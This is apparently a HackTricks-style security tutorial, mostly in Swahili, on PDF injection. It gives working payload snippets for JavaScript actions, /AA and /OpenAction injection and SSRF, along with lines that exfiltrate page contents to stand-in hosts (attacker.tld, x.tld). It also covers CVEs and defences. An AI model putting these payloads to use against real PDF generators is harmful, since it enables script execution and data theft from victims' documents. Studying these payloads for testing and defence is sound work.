# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Ikiwa ingizo lako linaonyeshwa ndani ya faili ya PDF, unaweza kujaribu kuingiza data za PDF ili kuendesha JavaScript, kufanya SSRF au kuiba maudhui ya PDF.**
PDF syntax ni yenye ustahimilivu mkubwa – ikiwa unaweza kutokea kutoka kwenye string au dictionary inayochanganya ingizo lako, unaweza kuongeza objects mpya kabisa (au keys mpya katika object ile ile) ambazo Acrobat/Chrome yatazisoma kwa urahisi.
Tangu 2024 wimbi la ripoti za bug-bounty limeonyesha kuwa *one unescaped parenthesis or back-slash is enough* kwa utekelezaji wa script kamili.

## TL;DR – Mkondo wa Shambulio wa Kisasa (2024-2026)
1. Tafuta thamani yoyote inayodhibitiwa na mtumiaji inayomalizika ndani ya **(parenthesis string)**, `/URI ( … )` au `/JS ( … )` field katika PDF iliyotengenezwa.
2. Ingiza `) ` (kuifunga string) ikifuatiwa na moja ya primitives hapa chini na maliza kwa parenthesis nyingine ya kufungua ili kuweka sintaksia sahihi.
3. Sambaza PDF hatari kwa mwathirika (au kwa backend service inayochora faili moja kwa moja – nzuri kwa blind bugs).
4. Payload yako inaendesha katika PDF viewer:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (inaweza kusafirisha nje maudhui yoyote ya faili kwa kutumia `this.getPageNthWord`)

Mfano (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Kama `)` ya kwanza inafunga kamba ya URI ya awali, basi tunaongeza kamusi mpya ya **Action** ambayo Acrobat itatekeleza wakati mtumiaji anabonyeza link.*

## Injection Primitives Zilizofaa
| Lengo | Snippet ya Payload | Maelezo |
|------|-----------------|-------|
| **JavaScript wakati wa kufunguliwa** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Inatekelezwa mara moja wakati hati inafunguliwa (inafanya kazi katika Acrobat, si katika Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Inafanya kazi katika PDFium & Acrobat ikiwa unadhibiti `/Link` annotation. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Unganisha na `this.getPageNthWord` ndani ya JS ili kuiba maudhui. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | Imefanya kama hapo juu lakini inalenga URL ya ndani – nzuri wakati PDF inachorwa na huduma za back-office ambazo zinaheshimu `/URI`. |
| **Vitendo vya Ziada (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Ambatanisha kwenye kamusi ya Page/Annotation/Form ili iendeshe wakati wa kufunguliwa/kupewa focus. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Ikiwa maktaba inakuwezesha kuingiza tabia za newline unaweza kuunda objects mpya kabisa. |

## Embedded Actions as Injection Targets
PDF viewers huchukulia **embedded actions** kama `/OpenAction` na `/AA` (Additional Actions) kama sifa za daraja la kwanza ambazo zinaweza kuendeshwa wakati hati inafunguliwa au wakati tukio maalum linapotokea. Ikiwa unaweza kuingiza kwenye kamusi yoyote inayokubali actions (Catalog, Page, Annotation, or Form field), unaweza kubandika `/AA` tree na kuamsha JavaScript wakati wa kufungua/kupewa focus.

Example payload for **generator-side object injection** (close the original string/dictionary and inject `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
This pattern matches recent jsPDF issues where attacker-controlled input passed into `addJS` (or certain AcroForm fields) breaks out of the intended JavaScript string and injects an **Additional Action** dictionary.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) alitoa mstari mmoja unaoorodhesha kila object ndani ya hati isiyojulikana — mzuri ukikosa kuona PDF iliyotengenezwa:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Msimbo huchambua Acrobat DOM na kutuma maombi ya nje kwa kila jozi ya property/value, kukupa dump ya faili ya *JSON-ish*.
Angalia white-paper “Portable Data **ex**Filtration” kwa mbinu kamili.

## Hitilafu za Ulimwengu Halisi (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: strings zinazodhibitiwa na mshambuliaji zinaweza kufunga literal ya JS na kuingiza `/AA` → `/O` → `/JavaScript` actions zinazotekelezwa wakati wa open/focus.
* **CVE-2024-4367** – Utekelezaji wa JavaScript kwa hiari katika PDF.js ya Firefox kabla ya 4.2.67 ulivuka sandbox kwa kutumia `/JavaScript` action iliyotengenezwa.
* **Bug bounty 2024-05** – Major fintech iliruhusu invoice notes zilizotolewa na mteja zilizowekwa ndani ya `/URI`; ripoti ililipwa $10k baada ya kuonyesha SSRF kwenda internal metadata host kwa kutumia `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection kupitia unsanitised PDF path inaonyesha umuhimu wa ku-escape backslashes na parentheses hata *kabla* ya safu ya PDF.

## Muhtasari wa Ulinzi
1. **Usichanganye kabisa input ghafi ya mtumiaji** ndani ya `(`…`)` strings au majina. Escape `\`, `(`, `)` kama inavyohitajika na §7.3 ya PDF spec au tumia hex strings `<...>`.
2. Ikiwa unajenga links, pendelea `/URI (https://…)` ambazo ume-URL-encode *kamili*; zuia `javascript:` schemes katika client viewers.
3. Ondoa au validate `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` na `/ImportData` dictionaries wakati wa post-processing ya PDFs.
4. Kwenye upande wa server, render PDFs zisizoaminika kwa *headless converter* (mf. qpdf –decrypt –linearize) ambayo inaondoa JavaScript na external actions.
5. Weka PDF viewers zikiwa za kisasa; PDF.js < 4.2.67 na Acrobat Reader kabla ya patches za Julai 2024 zinaruhusu utekeleaji wa code rahisi.
6. Ikiwa unatumia client-side generators (mf. jsPDF), usiweka input zisizoaminika ndani ya `addJS` au AcroForm setters ambazo zinaishia ndani ya PDF action dictionaries.

## References
* Gareth Heyes, “Portable Data **ex**Filtration – XSS for PDFs”, PortSwigger Research (updated May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
